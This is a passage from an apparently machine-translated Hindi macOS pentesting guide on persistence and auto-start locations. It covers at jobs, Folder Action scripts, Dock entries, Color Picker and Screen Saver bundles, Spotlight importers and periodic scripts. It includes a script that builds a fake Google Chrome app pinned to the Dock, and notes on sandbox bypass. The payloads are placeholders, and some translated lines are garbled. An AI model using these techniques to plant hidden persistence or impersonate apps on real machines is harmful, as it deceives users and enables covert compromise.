* **`at`** को **चलाने** की आवश्यकता होती है और यह सक्षम होना चाहिए

#### **विवरण**

"At tasks" का उपयोग **निश्चित समय पर कार्यों को निर्धारित करने** के लिए किया जाता है।\
ये कार्य cron से अलग होते हैं क्योंकि **ये एक बार के कार्य होते हैं** जो कि **निष्पादित होने के बाद हटा दिए जाते हैं**। हालांकि, वे **सिस्टम पुनरारंभ के बाद भी बच जाएंगे** इसलिए इन्हें एक संभावित खतरा के रूप में निराकरण नहीं किया जा सकता है।

**डिफ़ॉल्ट** रूप से वे **अक्षम** होते हैं लेकिन **रूट** उपयोगकर्ता उन्हें **सक्षम** कर सकता है:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
यह 1 घंटे में एक फ़ाइल बनाएगा:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
आईएचटीएमएल टैग का उपयोग करके `atq` का उपयोग करके नौकरी कतार की जांच करें:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
ऊपर हम दो निर्धारित कार्यों को देख सकते हैं। हम `at -c JOBNUMBER` का उपयोग करके कार्य का विवरण प्रिंट कर सकते हैं।
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
यदि AT tasks सक्षम नहीं हैं तो बनाए गए tasks को क्रियान्वित नहीं किया जाएगा।
{% endhint %}

**जॉब फ़ाइलें** `/private/var/at/jobs/` में मिल सकती हैं।
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
फ़ाइलनाम में कतार, नौकरी नंबर और यह समय होता है जिसे चलाने के लिए निर्धारित किया गया है। उदाहरण के लिए हम `a0001a019bdcd2` पर एक नज़र डालते हैं।

* `a` - यह कतार है
* `0001a` - हेक्स में नौकरी नंबर, `0x1a = 26`
* `019bdcd2` - हेक्स में समय। यह इपॉक के बाद बिताए गए मिनटों को प्रतिष्ठान करता है। `0x019bdcd2` दशमलव में `26991826` है। यदि हम इसे 60 से गुणा करें तो हमें `1619509560` मिलता है, जो `GMT: 2021 अप्रैल 27, मंगलवार 7:46:00` है।

यदि हम नौकरी फ़ाइल को प्रिंट करें, तो हमें `at -c` का उपयोग करके प्राप्त की गई जानकारी का पता चलता है।

### फ़ोल्डर क्रियाएँ

लेख: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
लेख: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* सैंडबॉक्स को छलना करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको तर्क के साथ osascript को कॉल करने और फ़ोल्डर क्रियाएँ को कॉन्फ़िगर करने की क्षमता होनी चाहिए

#### स्थान

* **`/Library/Scripts/Folder Action Scripts`**
* रूट की आवश्यकता
* **ट्रिगर**: निर्दिष्ट फ़ोल्डर तक पहुँच
* **`~/Library/Scripts/Folder Action Scripts`**
* **ट्रिगर**: निर्दिष्ट फ़ोल्डर तक पहुँच

#### विवरण और शोषण

एक फ़ोल्डर क्रिया स्क्रिप्ट उस फ़ोल्डर के साथ निर्धारित होने पर निष्पादित होता है जिसमें उसे जोड़ा जाता है या हटाया जाता है, या जब इसकी विंडो खुली, बंद, हटाई जाती है, या इसे आकार दिया जाता है:

* फ़ाइंडर UI के माध्यम से फ़ोल्डर खोलें
* फ़ोल्डर में एक फ़ाइल जोड़ें (ड्रैग/ड्रॉप या टर्मिनल से शेल प्रॉम्प्ट में भी किया जा सकता है)
* फ़ोल्डर से एक फ़ाइल हटाएँ (ड्रैग/ड्रॉप या टर्मिनल से शेल प्रॉम्प्ट में भी किया जा सकता है)
* यूआई के माध्यम से फ़ोल्डर से बाहर नेविगेट करें

इसे लागू करने के कुछ तरीके हैं:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) प्रोग्राम का उपयोग करके एक फ़ोल्डर क्रिया वर्कफ़्लो फ़ाइल (.workflow) बनाएं और इसे एक सेवा के रूप में स्थापित करें।
2. एक फ़ोल्डर पर दायां क्लिक करें, `Folder Actions Setup...`, `Run Service` का चयन करें, और मैन्युअल रूप से एक स्क्रिप्ट संलग्न करें।
3. OSAScript का उपयोग करके `System Events.app` को Apple Event संदेश भेजने के लिए प्रोग्रामेटिक रूप से एक नया `Folder Action` प्रश्न करें और पंजीकृत करें।



* यह एक तरीका है प्रद्युत्पन्नता को लागू करने का, जहां OSAScript का उपयोग करके Apple Event संदेश `System Events.app` को भेजने के लिए किया जाता है

यह स्क्रिप्ट निष्पादित होगा:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

इसे इस प्रकार कंपाइल करें: `osacompile -l JavaScript -o folder.scpt source.js`

फिर निम्नलिखित स्क्रिप्ट को निष्पादित करें ताकि फ़ोल्डर एक्शन को सक्षम किया जा सके और पहले से कंपाइल किए गए स्क्रिप्ट को फ़ोल्डर **`/users/username/Desktop`** के साथ संलग्न किया जा सके:
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
इस तरीके से स्क्रिप्ट को निष्पादित करें: `osascript -l JavaScript /Users/username/attach.scpt`



* यह एक GUI के माध्यम से स्थिरता को कार्यान्वित करने का तरीका है:

यह स्क्रिप्ट निष्पादित होगा:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

इसे इस तरह से कंपाइल करें: `osacompile -l JavaScript -o folder.scpt source.js`

इसे इस तारीख में ले जाएं:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
तो, `Folder Actions Setup` ऐप को खोलें, **वह फ़ोल्डर चुनें जिसे आप देखना चाहते हैं** और अपने मामले में **`folder.scpt`** को चुनें (मेरे मामले में मैंने इसे output2.scp नाम दिया था):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

अब, यदि आप उस फ़ोल्डर को **Finder** के साथ खोलें, तो आपका स्क्रिप्ट चलाया जाएगा।

यह कॉन्फ़िगरेशन **plist** में संग्रहीत किया गया था, जो बेस64 प्रारूप में है और स्थित है **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**।

अब, चलें इस persistence को GUI एक्सेस के बिना तैयार करने की कोशिश करें:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** को `/tmp` में बैकअप करने के लिए कॉपी करें:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. जो Folder Actions आपने अभी सेट किए हैं, उन्हें **हटा दें**:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

अब जब हमारे पास एक खाली environment है

3. बैकअप फ़ाइल कॉपी करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस कॉन्फ़िग को उपभोक्ता करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
और यह मेरे लिए काम नहीं करा, लेकिन ये लिखने के निर्देश हैं:(
{% endhint %}

### Spotlight Importers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* सैंडबॉक्स को छोड़ने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आप एक नया सैंडबॉक्स में आ जाएंगे

#### स्थान

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### विवरण

आप एक **भारी सैंडबॉक्स** में आ जाएंगे, इसलिए आप शायद इस तकनीक का उपयोग नहीं करना चाहेंगे।

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* सैंडबॉक्स को छोड़ने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको सिस्टम में एक खतरनाक एप्लिकेशन स्थापित करना होगा

#### स्थान

* `~/Library/Preferences/com.apple.dock.plist`
* **ट्रिगर**: जब उपयोगकर्ता डॉक में एप्लिकेशन पर क्लिक करता है

#### विवरण और शोषण

डॉक में दिखाई देने वाले सभी एप्लिकेशन प्लिस्ट में निर्दिष्ट होते हैं: **`~/Library/Preferences/com.apple.dock.plist`**

यह संभव है कि आप एक एप्लिकेशन जोड़ सकते हैं बस इसके साथ:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

कुछ **सामाजिक इंजीनियरिंग** का उपयोग करके आप डॉक के अंदर उदाहरण के लिए Google Chrome की अनुकरण कर सकते हैं और वास्तव में अपनी स्क्रिप्ट को चला सकते हैं:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### कलर पिकर्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* एक बहुत विशिष्ट कार्रवाई होनी चाहिए
* आप एक और सैंडबॉक्स में समाप्त हो जाएंगे

#### स्थान

* `/Library/ColorPickers`&#x20;
* रूट की आवश्यकता होती है
* ट्रिगर: कलर पिकर का उपयोग करें
* `~/Library/ColorPickers`
* ट्रिगर: कलर पिकर का उपयोग करें

#### विवरण और उत्पादन

अपने कोड के साथ एक कलर पिकर बंडल को कंपाइल करें (आप [**इसका उपयोग कर सकते हैं उदाहरण के लिए**](https://github.com/viktorstrate/color-picker-plus)) और एक constructor जोड़ें (जैसे [स्क्रीन सेवर खंड](macos-auto-start-locations.md#screen-saver) में) और बंडल को `~/Library/ColorPickers` में कॉपी करें।

फिर, जब कलर पिकर ट्रिगर होता है, आपका कोड भी होना चाहिए।

ध्यान दें कि आपकी लाइब्रेरी को लोड करने वाला बाइनरी एक **बहुत सीमित सैंडबॉक्स** है: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### फ़ाइंडर सिंक प्लगइन्स

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**लेख**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* सैंडबॉक्स को दौर करने के लिए उपयोगी: **नहीं, क्योंकि आपको अपना खुद का ऐप्लिकेशन चलाना होगा**

#### स्थान

* एक विशेष ऐप

#### विवरण और उत्पादन

फ़ाइंडर सिंक एक्सटेंशन के साथ एक ऐप्लिकेशन उदाहरण [**यहां पाया जा सकता है**](https://github.com/D00MFist/InSync).

ऐप्लिकेशन में `फ़ाइंडर सिंक एक्सटेंशन` हो सकता है। यह एक्सटेंशन एक ऐप्लिकेशन के अंदर जाएगा जो चलाया जाएगा। इसके अलावा, एक्सटेंशन को अपनी कोड को चलाने के लिए **किसी वैध Apple डेवलपर सर्टिफिकेट के साथ साइन किया जाना चाहिए**, इसे **सैंडबॉक्स** करना चाहिए (हालांकि ढीली छूटें जोड़ी जा सकती हैं) और इसे कुछ इस तरह से पंजीकृत किया जाना चाहिए:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### स्क्रीन सेवर

लेख: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
लेख: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आप एक सामान्य एप्लिकेशन सैंडबॉक्स में अंत में पहुंचेंगे

#### स्थान

* `/System/Library/Screen Savers`&#x20;
* रूट अनिवार्य
* **ट्रिगर**: स्क्रीन सेवर का चयन करें
* `/Library/Screen Savers`
* रूट अनिवार्य
* **ट्रिगर**: स्क्रीन सेवर का चयन करें
* `~/Library/Screen Savers`
* **ट्रिगर**: स्क्रीन सेवर का चयन करें

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण और शोषण

Xcode में एक नया प्रोजेक्ट बनाएं और एक नया **स्क्रीन सेवर** उत्पन्न करने के लिए टेम्पलेट का चयन करें। फिर, इसे अपने कोड में शामिल करें, उदाहरण के लिए निम्नलिखित कोड ताकि लॉग उत्पन्न हों।

**बिल्ड** करें, और `.saver` बंडल को **`~/Library/Screen Savers`** में कॉपी करें। फिर, स्क्रीन सेवर GUI खोलें और उस पर क्लिक करें, इससे बहुत सारे लॉग उत्पन्न होने चाहिए:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
ध्यान दें कि इस कोड को लोड करने वाले बाइनरी (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) की entitlements में आप **`com.apple.security.app-sandbox`** खोज सकते हैं, इसलिए आप **सामान्य एप्लिकेशन सैंडबॉक्स के अंदर** होंगे।
{% endhint %}

सेवर कोड:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### स्पॉटलाइट प्लगइन

सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)

* लेकिन आप एक एप्लिकेशन सैंडबॉक्स में अंत में पहुंचेंगे

#### स्थान

* `~/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक एक्सटेंशन वाली नई फ़ाइल बनाई जाती है।
* `/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक एक्सटेंशन वाली नई फ़ाइल बनाई जाती है।
* रूट की आवश्यकता होती है
* `/System/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक एक्सटेंशन वाली नई फ़ाइल बनाई जाती है।
* रूट की आवश्यकता होती है
* `Some.app/Contents/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक एक्सटेंशन वाली नई फ़ाइल बनाई जाती है।
* नई ऐप की आवश्यकता होती है

#### विवरण और शोषण

स्पॉटलाइट मैकओएस का अंतर्निहित खोज सुविधा है, जिसका उद्देश्य उपयोगकर्ताओं को उनके कंप्यूटर पर डेटा तक त्वरित और व्यापक पहुंच प्रदान करना है।\
इस त्वरित खोज क्षमता को सुविधाजनक बनाने के लिए, स्पॉटलाइट एक **प्रोप्राइटरी डेटाबेस** बनाए रखता है और एक इंडेक्स बनाता है जिसमें **अधिकांश फ़ाइलें पार्स की जाती हैं**, जिससे फ़ाइलों के नाम और उनकी सामग्री के माध्यम से त्वरित खोज की जा सके।

स्पॉटलाइट की आधारभूत यांत्रिकी में 'mds' नामक एक केंद्रीय प्रक्रिया होती है, जिसे 'मेटाडेटा सर्वर' के लिए खड़ा किया गया है। यह प्रक्रिया संपूर्ण स्पॉटलाइट सेवा को संचालित करती है। इसके साथ, कई 'mdworker' डेमन होते हैं जो विभिन्न रखरखाव कार्यों को करते हैं, जैसे कि विभिन्न फ़ाइल प्रकारों को इंडेक्स करना (`ps -ef | grep mdworker`)। ये कार्य संभव होते हैं स्पॉटलाइट इंपोर्टर प्लगइन या **".mdimporter बंडल"** के माध्यम से, जो स्पॉटलाइट को विभिन्न फ़ाइल प्रारूपों की सामग्री को समझने और इंडेक्स करने की सुविधा प्रदान करते हैं।

प्लगइन या **`.mdimporter`** बंडल पहले से ही उल्लिखित स्थानों में स्थित होते हैं और यदि एक नया बंडल दिखाई देता है तो यह मिनटों के भीतर लोड हो जाता है (किसी भी सेवा को पुनः प्रारंभ करने की आवश्यकता नहीं होती है)। इन बंडलों को इंडिकेट करना चाहिए कि वे कौन से **फ़ाइल प्रकार और एक्सटेंशन को प्रबंधित कर सकते हैं**, इस तरह, स्पॉटलाइट उन्हें उपयोग करेगा जब एक नई फ़ाइल उल्लिखित एक्सटेंशन के साथ बनाई जाती है।

सभी लोड होने वाले `mdimporters` को खोजना संभव है निम्नलिखित को चला कर पाएं:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** इस तरह के फ़ाइलों (एक्सटेंशन `.iba` और `.book` आदि) को पार्स करने के लिए उपयोग किया जाता है:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
यदि आप अन्य `mdimporter` के Plist की जांच करते हैं तो आपको प्रविष्टि **`UTTypeConformsTo`** नहीं मिलेगी। इसलिए यह एक अंतर्निहित _यूनिफॉर्म टाइप पहचानकर्ता_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) है और इसे विस्तारों को निर्दिष्ट करने की आवश्यकता नहीं होती है।

इसके अलावा, सिस्टम डिफ़ॉल्ट प्लगइन हमेशा प्राथमिकता देते हैं, इसलिए एक हमलावर केवल उन फ़ाइलों तक पहुंच सकता है जिन्हें अन्यथा Apple के अपने `mdimporters` द्वारा सूचीबद्ध नहीं किया गया है।
{% endhint %}

अपना खुद का आयातकर्ता बनाने के लिए आप इस प्रोजेक्ट से शुरू कर सकते हैं: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) और फिर नाम, **`CFBundleDocumentTypes`** और **`UTImportedTypeDeclarations`** को बदलें ताकि यह वह विस्तार समर्थित करें जिसे आप समर्थन करना चाहते हैं और उन्हें **`schema.xml`** में प्रतिबिंबित करें।\
फिर **`GetMetadataForFile`** फ़ंक्शन कोड को **बदलें** ताकि जब प्रसंस्कृत विस्तार के साथ एक फ़ाइल बनाई जाती है, तो आपका पेलोड निष्पादित हो।

अंत में अपना नया `.mdimporter` **बनाएं और कॉपी करें** उपरोक्त स्थानों में और आप जब भी यह लोड होता है उसे जांच सकते हैं **लॉग्स की निगरानी** या **`mdimport -L.`** की जांच करके।

### ~~Preference Pane~~

{% hint style="danger" %}
ऐसा लगता नहीं है कि यह अब काम कर रहा है।
{% endhint %}

लेख: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* सैंडबॉक्स को छलना करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* इसे एक विशेष उपयोगकर्ता क्रिया की आवश्यकता होती है

#### स्थान

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### विवरण

ऐसा लगता नहीं है कि यह अब काम कर रहा है।

## रूट सैंडबॉक्स छलना

{% hint style="success" %}
यहां आपको **सैंडबॉक्स छलने** के लिए उपयोगी शुरू स्थान मिलेंगे जिससे आप केवल कुछ को **फ़ाइल में लिखकर** बस **रूट** होकर कुछ कर सकते हैं और/या अन्य **अजीब शर्तों** की आवश्यकता होती है।
{% endhint %}

### आवधिक

लेख: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए

#### स्थान

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* रूट की आवश्यकता होती है
* **ट्रिगर**: समय आने पर
* `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local`
* रूट की आवश्यकता होती है
* **ट्रिगर**: समय आने पर

#### विवरण और शोषण

आवधिक स्क्रिप्ट (**`/etc/periodic`**) को **लॉन्च डेमन** के कारण निष्पादित किया जाता है जो `/System/Library/LaunchDaemons/com.apple.periodic*` में कॉन्फ़िगर किए गए होते हैं। ध्यान दें कि `/etc/periodic/` में संग्रहीत स्क्रिप्ट **फ़ाइल के मालिक के रूप में निष्पादित** होते हैं, इसलिए यह किसी संभावित विशेषाधिकार उन्नयन के लिए काम नहीं करेगा।

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

वहाँ अन्य आवधिक स्क्रिप्ट हैं जो क्रियान्वित होंगे जो **`/etc/defaults/periodic.conf`** में दिखाए गए हैं:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
यदि आप `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local` फ़ाइलों में से किसी भी फ़ाइल को लिखने में सफल होते हैं, तो यह **जल्द ही या बाद में निष्पादित होगी**।

{% hint style="warning" %}
ध्यान दें कि आवधिक स्क्रिप्ट **स्क्रिप्ट के मालिक के रूप में निष्पादित होगी**। इसलिए यदि एक सामान्य उपयोगकर्ता स्क्रिप्ट का मालिक है, तो यह उपयोगकर्ता के रूप में निष्पादित होगी (यह विशेषाधिकार बढ़ाने के हमलों को रोक सकता है)।
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* सैंडबॉक्स को अनदेखा करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए

#### स्थान

* हमेशा रूट की आवश्यकता होती है

#### विवरण और शोषण

